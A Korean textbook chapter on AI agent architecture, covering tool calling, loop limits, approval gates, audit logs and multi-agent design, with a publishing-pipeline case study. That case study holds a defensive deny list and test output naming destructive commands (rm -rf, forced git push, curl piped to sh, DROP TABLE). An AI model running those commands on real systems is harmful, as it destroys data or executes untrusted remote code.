# AI 에이전트: Single Agent, Tool Calling, Loop, Harness, Multi-Agent

> 중요도: **A** · 이 장의 목표: 에이전트가 도구를 쓰는 구조를 설명하고, 반복 상한과 예산, 승인 게이트, 감사 로그로 에이전트를 통제한다.

> 2026-11-23 추가 장 (로드맵 M19–M22 항목). 반복 상한, 예산, 승인 게이트, 감사 로그는 `Batch3.java`에서 실행해 통과를 확인했다. **실제 LLM이 도구를 고르는 과정은 API 키가 없어서 실행하지 않았다.** 계획을 미리 정해 둔 상태에서 제어 로직만 확인했다.

---

## 1. Single Agent와 Tool Calling

**정의** — 에이전트는 목표를 받으면 LLM이 다음에 할 행동을 고르고, 도구를 호출하고, 결과를 보고 다시 판단하는 반복 구조다. 한 명의 에이전트가 이 흐름을 맡으면 Single Agent다.

**Tool Calling** — 모델이 텍스트로 "이 도구를 이 인자로 호출하라"는 요청을 만들면, 애플리케이션이 실제로 도구를 실행하고 결과를 다시 모델에 넘긴다. 모델이 직접 시스템을 건드리지 않는다. **실행은 항상 애플리케이션 코드가 한다.**

**도구 설계 원칙**
- 도구마다 입력 스키마(필드, 타입)를 정하고, 호출 전에 검증한다.
- 읽기 도구와 쓰기 도구를 구분한다. 쓰기 도구는 더 엄격하게 막는다.
- 도구 실패(타임아웃, 잘못된 입력)를 모델에게 명확한 오류로 돌려준다.

**흔한 오해:** 도구가 있으면 에이전트가 똑똑해진다는 생각. 실제로는 도구 설계와 제한이 안전과 품질을 결정한다.

## 2. Loop Engineering: 언제 멈출지 정하기

**정의** — 에이전트는 "실행 → 관찰 → 평가 → 수정"을 반복한다. 이 반복에 종료 조건과 예산을 걸어야 한다.

**반드시 걸어야 하는 것**
- **최대 단계 수:** 무한 반복을 막는다.
- **토큰 또는 비용 예산:** 끝나지 않는 대화로 비용이 쌓이는 것을 막는다.
- **완료 조건:** 목표가 달성됐는지 명확히 판단하는 기준.
- **같은 행동 반복 감지:** 같은 도구를 같은 인자로 계속 부르면 멈춘다.

**구현 (검증 완료)**

```java
static String runAgent(int maxSteps, int budget, List<String> plannedTools, Set<String> needsApproval, boolean approved) {
    int spent = 0;
    for (int step = 1; step <= maxSteps; step++) {
        if (step - 1 >= plannedTools.size()) return "DONE";              // 계획 완료
        String tool = plannedTools.get(step - 1);
        spent += 100;                                                    // 한 단계의 토큰 비용 (가정)
        if (spent > budget) { auditLog.add("STOP: 예산 초과"); return "BUDGET"; }
        if (needsApproval.contains(tool) && !approved) { auditLog.add("DENY: " + tool + " 승인 없음"); return "DENIED"; }
        auditLog.add("CALL: " + tool);
    }
    return "MAX_STEPS";                                                  // 상한에 도달
}
```

- **확인:** 계획이 끝나면 `DONE`, 단계 수가 상한에 닿으면 `MAX_STEPS`, 예산을 넘으면 `BUDGET`으로 멈춘다(검증 완료).

## 3. Harness Engineering: 승인과 감사

**정의** — 에이전트를 감싸서 안전하게 실행하는 틀이다. 샌드박스(격리된 실행 환경), 최소 권한, 승인 게이트, 감사 로그, 복구 방법을 포함한다.

**승인 게이트** — 삭제, 결제, 외부 전송처럼 되돌리기 어려운 도구는 사람이 승인해야 실행된다.

**감사 로그** — 누가, 무엇을, 언제, 어떤 인자로 호출했는지 남긴다. 거부된 시도도 남긴다. 사고가 났을 때 원인을 추적하는 기록이다.

**검증 결과:** 승인 없이 `delete_user`를 호출하면 `DENIED`로 멈추고, 감사 로그에 `DENY` 기록이 남는다. 승인하면 같은 계획이 `DONE`으로 끝난다(검증 완료).

**최소 권한 원칙:** 에이전트에게 필요한 도구와 데이터만 준다. "나중에 쓸지도 모르니 다 주자"는 위험하다.

---

## 4. Sub-Agent와 Multi-Agent

**정의** — 큰 목표를 여러 역할(검색, 작성, 검증)로 나눠 여러 에이전트가 맡는 구조다.

**언제 쓰나** — 역할 분리가 실제로 품질을 높이거나 병렬로 시간을 줄일 때만 쓴다. 단순한 작업에 여러 에이전트를 쓰면 비용과 복잡도만 늘어난다.

**비교 원칙:** Single Agent 대비 정확도, 비용, 지연 시간을 같은 평가 데이터로 비교한 뒤 채택한다(53장의 평가 방법 사용). 무조건 고급 구조가 좋다고 가정하지 않는다.

**구조 구분 (정의)**

| 구조 | 한 줄 정의 | 주로 필요한 때 |
|---|---|---|
| Single Agent | 모델 하나가 계획과 도구 호출을 맡는다 | 대부분의 기본 작업 |
| Tool Calling | 모델이 정해진 도구 이름과 인자를 골라 호출한다 | 외부 데이터나 동작이 필요할 때 |
| Loop | 결과를 보고 다음 행동을 정하는 반복 구조 | 여러 단계를 거쳐야 할 때 (반복 상한 필수) |
| Harness | 에이전트를 감싸는 안전 틀(샌드박스, 승인, 감사) | 실행 권한이 있는 모든 에이전트 |
| Sub-Agent | 상위 에이전트가 특정 작업을 떼어 맡기는 하위 에이전트 | 작업이 독립적으로 나뉠 때 |
| Multi-Agent | 역할이 다른 여러 에이전트가 협업하는 구조 | 역할 분리가 품질을 실제로 높일 때 |

**구별:** Harness는 구조가 아니라 "안전 틀"이라서 Single Agent에도 붙는다. Sub-Agent와 Multi-Agent는 에이전트 수와 역할 분리의 차이다.

**실습 과제**
1. 같은 질문 20개를 Single Agent와 검증 에이전트 추가 구조로 돌려 정확도와 비용을 비교한다.
2. 쓰기 도구에 승인 게이트를 붙이고, 승인 없이 호출되는 경우가 없는지 감사 로그로 확인한다.

## 사례: 멀티 에이전트 출판 파이프라인의 승인과 거부 목록 (2026-11-23 보강)

**출처와 범위**: 선생님 자료 `Additional_HandBook★/AI 멀티 에이전트 도우미/자습서.html`(열람 암호 보호)을 읽고 정리했다. 이 자습서는 특정 앱(1인 AI 출판사)을 설치하는 안내서다. 여기서는 설치 방법이 아니라 **역할 분담, 승인 지점, 명령 통제**라는 설계 원리만 가져왔다. 아래 게이트 코드는 이 PC에서 실행해 확인했다.

**구성 요소**
- **역할 분담**: 편집장 1명이 작업을 나누고, 직원 4명이 기획·조사·집필·교정을 맡는다. 역할은 `.claude/agents/` 파일로 정의한다. 한 에이전트가 모든 일을 하지 않으므로 각 단계의 책임이 나뉜다.
- **승인 지점 2개**: 제안(제목 3안과 목차)에 한 번, 최종 원고에 한 번 사람이 승인한다. 승인 없이는 다음 단계로 넘어가지 않는다.
- **명령 통제**: `.claude/settings.json`에 평소 작업은 묻지 않되 **위험한 명령은 거부하는 목록**을 둔다.
- **노출 범위**: 관리 화면은 `localhost`에서만 열린다. 같은 PC 밖에서는 접속할 수 없다. 외부 공개는 별도 설계가 필요하다.

**승인 게이트와 거부 목록 (확인함)**

```javascript
// 거부 목록: 위험한 명령을 실행 전에 막는다
const DENY = [/rm\s+-rf/, /git\s+push\s+--force/, /curl\s+.*\|\s*sh/, /DROP\s+TABLE/i];

// 상태 전이: 제안 → (승인) → 집필 → (승인) → 배포
// 승인 없이 쓰기나 배포를 하면 막힌다
```

```
{ state: 'published', log: [
    'BLOCKED: write before gate1',   // 1차 승인 전 집필 시도는 막힘
    'gate1 approved',
    'draft written',
    'gate2 approved',
    'published' ] }
{ state: 'proposal', log: [ 'BLOCKED: publish in state proposal' ] }   // 승인 없이 배포 불가
ls books/ -> allowed
rm -rf books/ -> blocked
git push --force origin main -> blocked
curl http://x | sh -> blocked
```

**읽는 법**
- 게이트는 **순서**를 강제한다. 승인 없이 집필하거나 배포하려 하면 상태가 바뀌지 않고 기록만 남는다.
- 거부 목록은 **명령 문자열**을 본다. 정규식은 흔한 위험 패턴(삭제, 강제 푸시, 원격 스크립트 실행, 테이블 삭제)을 막는다. 문자열 검사는 우회될 수 있으므로 최소 권한과 함께 쓴다.
- 사람은 제안과 최종본에서만 개입한다. 그 사이의 작업은 에이전트가 하고, 감사 기록(로그)을 남긴다(3절과 같은 원리).

**주의**
- 에이전트끼리 나눈 대화가 그럴듯해도 사실이라는 보장은 없다. 자료도 조사 단계에서 출처를 적게 한다. 출처 검증은 사람 몫이다.
- `localhost` 바인딩은 외부 공격을 줄이지만 안전을 보장하지 않는다. 같은 PC의 다른 프로그램은 접속할 수 있다.

**면접 기준**: "멀티 에이전트는 역할을 나누고, 사람이 승인하는 지점을 정해 순서를 강제합니다. 위험한 명령은 실행 전에 거부 목록으로 막고, 모든 단계를 기록합니다."
